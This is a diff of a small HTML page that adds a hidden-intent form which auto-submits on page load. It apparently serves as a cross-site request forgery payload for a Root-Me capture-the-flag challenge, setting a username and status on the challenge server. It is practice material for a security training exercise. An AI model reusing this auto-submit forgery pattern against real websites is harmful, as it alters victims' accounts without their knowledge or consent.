@@ -3,7 +3,20 @@
   <head>
     <title>Test</title>
   </head>
-  <body>
-    Why don't this work??
+  <body onload="document.forms[0].submit();">
+    <fieldset><legend>Update Profile</legend>
+		<form action="http://challenge01.root-me.org/web-client/ch22/index.php" method="post" enctype="multipart/form-data">
+		<div class="form-group">
+		<label>Username:</label>
+		<input type="text" name="username" value="vlad">
+		</div>
+		<br>		
+		<div class="form-group">
+		<label>Status:</label>
+		<input type="checkbox" name="status" checked >
+		</div>
+		<br>	
+		<button type="submit">Submit</button>
+		</form></fieldset>
   </body>
 </html>
